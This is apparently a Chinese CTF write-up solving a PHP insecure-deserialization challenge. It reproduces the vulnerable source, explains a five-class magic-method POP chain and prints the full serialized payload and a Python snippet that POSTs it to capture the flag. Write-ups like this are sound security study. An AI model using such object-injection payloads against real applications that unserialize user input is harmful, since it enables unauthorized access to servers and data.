# 链式反应 — WriteUp

| 项目 | 内容 |
|---|---|
| 分类 | Web / PHP 反序列化（五层魔术方法 POP 链） |
| 分值 | 752（动态分值） |
| 类型 | DynamicContainer |
| 入口 | `http://103.163.47.230:34418`（赛后已释放） |
| Flag | `HTUCTF{51c36513-5c88-448a-bb2e-0f8f1d645dba}` |
| 提交记录 | 1 次，submitId 4735，Accepted |
| 复现脚本 | `exp.py`（构造 payload 并 POST）、`index.php`（还原出来的源码） |

## 1. 源码

首页 `highlight_file(__FILE__)` 直接把整份代码吐出来（HTML 高亮，去掉标签即可还原，见 `index.php`）：

```php
include("flag.php");
class Software { private $plugin;
    public function __destruct() { $hook = $this->plugin->dispatch(); $hook(); } }
class Plugin { private $config;
    public function __call($name, $args) { return $this->config->loader; } }
class Config { private $worker;
    public function __get($name) { return $this->worker; } }
class Worker { private $eagle;
    public function __invoke() { echo $this->eagle; } }
class Eagle { private $token; private $armed = false;
    public function __wakeup() { $this->armed = ($this->token === "black-eagle"); }
    public function __toString() { if ($this->armed) { global $flag; echo $flag; } return ""; } }

$raw = $_POST['data'] ?? $_GET['data'] ?? null;
$obj = @unserialize($raw);
if (!is_object($obj) || !($obj instanceof Software)) die("入口对象非法…");
unset($obj);   // 触发 __destruct
```

## 2. 链子

```
Software::__destruct
  └─ $this->plugin->dispatch()      Plugin 没有 dispatch 方法 → Plugin::__call
       └─ return $this->config->loader   Config 没有 loader 属性 → Config::__get
            └─ return $this->worker      拿到 Worker 对象
  └─ $hook()                        Worker 可调用 → Worker::__invoke
       └─ echo $this->eagle         对象当字符串 → Eagle::__toString
            └─ armed === true → echo $flag
```

`Eagle::__wakeup` 里 `armed = ($token === "black-eagle")`，所以 **token 必须正好是 `black-eagle`**。
题面那句「名字若叫错，鹰便一直睡着」说的就是这个：token 写错，`armed` 永远 false，`__toString` 一声不吭。

## 3. 构造 payload

所有属性都是 `private`，序列化时键名要带类名混淆前缀 `\0Class\0prop`，长度按 **含两个 NUL 字节** 计算：

| 属性 | 序列化键 | 长度 |
|---|---|---|
| Software::$plugin | `\0Software\0plugin` | 16 |
| Plugin::$config | `\0Plugin\0config` | 14 |
| Config::$worker | `\0Config\0worker` | 14 |
| Worker::$eagle | `\0Worker\0eagle` | 13 |
| Eagle::$token | `\0Eagle\0token` | 12 |

```php
O:8:"Software":1:{s:16:"\0Software\0plugin";O:6:"Plugin":1:{s:14:"\0Plugin\0config";
O:6:"Config":1:{s:14:"\0Config\0worker";O:6:"Worker":1:{s:13:"\0Worker\0eagle";
O:5:"Eagle":1:{s:12:"\0Eagle\0token";s:11:"black-eagle";}}}}}
```

`armed` 可以不写，`__wakeup` 会自己算。

## 4. 打过去

payload 里有 NUL 字节，用 POST + urlencode：

```python
O = lambda c, p: 'O:%d:"%s":%d:{%s}' % (len(c), c, len(p), ''.join(p))
eagle  = O("Eagle",    [s("\0Eagle\0token") + s("black-eagle")])
worker = O("Worker",   [s("\0Worker\0eagle") + eagle])
config = O("Config",   [s("\0Config\0worker") + worker])
plugin = O("Plugin",   [s("\0Plugin\0config") + config])
data   = O("Software", [s("\0Software\0plugin") + plugin])
POST /  data=<urlencode(data)>
```

响应源码后面直接跟着：

```
HTUCTF{51c36513-5c88-448a-bb2e-0f8f1d645dba}<br>链式反应已终止。
```

`unset($obj)` 触发 `__destruct`，flag 在「链式反应已终止」之前就 echo 出来了。

## 5. 一句话总结

五个类的魔术方法首尾相接（`__destruct` → `__call` → `__get` → `__invoke` → `__toString`），
唯一的人工关节是 `Eagle::$token` 必须等于 `black-eagle`。
